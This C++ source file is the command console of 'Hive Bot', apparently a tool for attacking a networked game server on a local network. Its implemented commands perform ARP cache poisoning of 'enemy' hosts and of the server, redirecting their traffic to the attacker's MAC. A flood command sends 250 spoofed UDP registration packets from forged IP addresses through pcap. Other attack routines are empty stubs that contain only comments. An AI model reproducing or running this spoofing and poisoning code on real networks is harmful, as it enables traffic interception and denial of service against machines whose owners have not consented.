/*
 * Copyright (c) 2017 The Hive Bot project authors. All rights reserved.
 * Use of this source code is governed by a BSD-style license that can be
 * found in the LICENSE file.
 */

/*
 * command_manager.cc - Command manager header.
 *
 * Handles the execution of all commands sent to console.
 */

#include "command_manager.h"

#include <iostream>
#include <string>
#include <sstream>
#include <unordered_map>

#include "protocol_utils.h"

namespace hive_bot {

CommandManager::CommandManager(Bot* bot) {
  bot_ = bot;
}

void CommandManager::PrintHelp(std::string message) {
  std::cout << "=====[ Hive Bot Help ]=====" << std::endl;
  std::cout << "h|help - Prints this help page" << std::endl;
  std::cout << "q|quit - Turns off the bot" << std::endl;
  std::cout << "r|respawn - Sends the server a respawn packet" << std::endl;
  std::cout << "d|device - Selects which network to attack" << std::endl;
  std::cout << "s|scan - Refresh all MAC addresses" << std::endl;
  std::cout << "c|collect - Collect all student IDs" << std::endl;
  std::cout << "a|attack - Perform the automated attack" << std::endl;
  std::cout << "f|flood - Flood the server with spam bots" << std::endl;
  std::cout << "ha|healallies - Heal all ally ARP caches" << std::endl;
  std::cout << "he|healenemies - Heal all enemy ARP caches" << std::endl;
  std::cout << "pe|poisonenemies - Toggle poisoning enemies" << std::endl;
  std::cout << "ps|poisonserver - Toggle poisoning the server" << std::endl;
}

void CommandManager::Respawn(std::string message) {
  bot_->Respawn();
  std::cout << "Bot respawned" << std::endl;
}

void CommandManager::Device(std::string message) {
  SelectDevice();
}

void CommandManager::Scan(std::string message) {
  FetchMacs(server_ip);
}

void CommandManager::CollectIds(std::string message) {
  // Poison enemies towards us

  // Send server tick packet (1 enemy @ bottom left)

  // Retrieve IDs from move packets
}

void CommandManager::AutomatedAttack(std::string message) {
  // Collect IDs

  // Start poisoning enemies

  // Start poisoning the server

  // Listen and respond to server (using enemies as drones)
}

void CommandManager::Flood(std::string message) {
  // Floods the server with spam bots
  if (pcap == NULL) {
    std::cout << "You must first choose a valid device" << std::endl;
    return;
  }

  if (server_mac == NULL) {
    std::cout << "No server MAC found, have you scanned the network?";
    std::cout << std::endl;
    return;
  }

  char payload[512];
  char ip[32];
  const u_short header_length = sizeof(struct UdpHeader) +
                                sizeof(struct Ipv4Header) +
                                sizeof(struct EthernetHeader);

  for (size_t i = 0; i < 250; i++) {
    sprintf_s(payload, "Register  TOTALLY\nLEGIT\nPLAYER\n%d,Guy,Fawkes,0", i);
    sprintf_s(ip, "10.0.0.%d", i);
    u_int length = strlen(payload);
    u_char* packet = (u_char*) malloc(length + header_length);

    u_char* message = packet + header_length;
    memcpy(message, payload, length);

    WriteUdp(length, packet, (client_port + i), server_port, server_mac,
             (char*) "1337420b142e", ip, strdup(server_ip.c_str()));

    if (pcap_sendpacket(pcap, packet, length + header_length) != 0) {
      std::cout << "Error sending packet: " << pcap_geterr(pcap) << std::endl;
      return;
    }

    free(packet);
  }

  std::cout << "Server flooded" << std::endl;
}

void CommandManager::HealAllies(std::string message) {
  // Poison allies back to server
}

void CommandManager::HealEnemies(std::string message) {
  // Poison enemies back to server
}

void CommandManager::PoisonEnemies(std::string message) {
  // Start poisoning enemies towards dummy server
  if (enemy_poison_task_ != nullptr && enemy_poison_task_->IsRunning()) {
    std::cout << "Stopping previous poison enemies attack..." << std::endl;
    enemy_poison_task_->Stop();
    return;
  }

  if (enemy_arp_table.size() == 0) {
    std::cout << "No enemy addresses found, have you scanned the network?";
    std::cout << std::endl;
    return;
  }

  char* spoof_ip = strdup(server_ip.c_str());
  char* spoof_mac = (char*) "1337420b142e";
  std::unordered_map<char*, char*> spoof_addresses = {
    {spoof_ip, spoof_mac}
  };
  u_long duration = 5;

  enemy_poison_task_ = std::unique_ptr<PoisonTask>(
    new PoisonTask(enemy_arp_table, spoof_addresses, duration));

  if (enemy_poison_task_->Start()) {
    std::cout << "Poison enemies attack now running in background" << std::endl;
  }
}

void CommandManager::PoisonServer(std::string message) {
  // Start poisoning the server (enemy IPs to our MAC)
  if (server_poison_task_ != nullptr && server_poison_task_->IsRunning()) {
    std::cout << "Stopping previous poison server attack..." << std::endl;
    server_poison_task_->Stop();
    return;
  }

  if (server_mac == NULL) {
    std::cout << "No server MAC found, have you scanned the network?";
    std::cout << std::endl;
    return;
  }

  char* spoof_mac = our_mac;
  std::unordered_map<char*,char*> victim_address = {
    {strdup(server_ip.c_str()), server_mac}
  };
  std::unordered_map<char*, char*> spoof_addresses;

  for (auto& it : enemy_arp_table) {
    char* spoof_ip = it.first;
    spoof_addresses.insert({spoof_ip, spoof_mac});
  }

  u_long duration = 5;

  server_poison_task_ = std::unique_ptr<PoisonTask>(
    new PoisonTask(victim_address, spoof_addresses, duration));

  if (server_poison_task_->Start()) {
    std::cout << "Poison server attack now running in background" << std::endl;
  }
}

void CommandManager::Run() {
  std::unordered_map<std::string, Command> commands = {
    {"help", &CommandManager::PrintHelp},
    {"h", &CommandManager::PrintHelp},
    {"respawn", &CommandManager::Respawn},
    {"r", &CommandManager::Respawn},
    {"device", &CommandManager::Device},
    {"d", &CommandManager::Device},
    {"scan", &CommandManager::Scan},
    {"s", &CommandManager::Scan},
    {"collect", &CommandManager::CollectIds},
    {"c", &CommandManager::CollectIds},
    {"attack", &CommandManager::AutomatedAttack},
    {"a", &CommandManager::AutomatedAttack},
    {"flood", &CommandManager::Flood},
    {"f", &CommandManager::Flood},
    {"healallies", &CommandManager::HealAllies},
    {"ha", &CommandManager::HealAllies},
    {"healenemies", &CommandManager::HealEnemies},
    {"he", &CommandManager::HealEnemies},
    {"poisonenemies", &CommandManager::PoisonEnemies},
    {"pe", &CommandManager::PoisonEnemies},
    {"poisonserver", &CommandManager::PoisonServer},
    {"ps", &CommandManager::PoisonServer}
  };

  std::cout << std::endl << "Enter commands here, type 'help' for help.";
  std::cout << std::endl;

  for (;;) {
    std::cout << "> ";
    std::string message;
    std::getline(std::cin, message);

    if (message == "exit" || message == "e" ||
        message == "quit" || message == "q") {
      return;
    }

    if (message == "") {
      continue;
    }

    std::stringstream stream(message);
    std::string first_argument;
    stream >> first_argument;
    auto command_mapping = commands.find(first_argument);

    if (command_mapping == commands.end()) {
      std::cout << "Command not found" << std::endl;
    } else {
      (this->*command_mapping->second)(message);
    }
  }
}

} // hive_bot
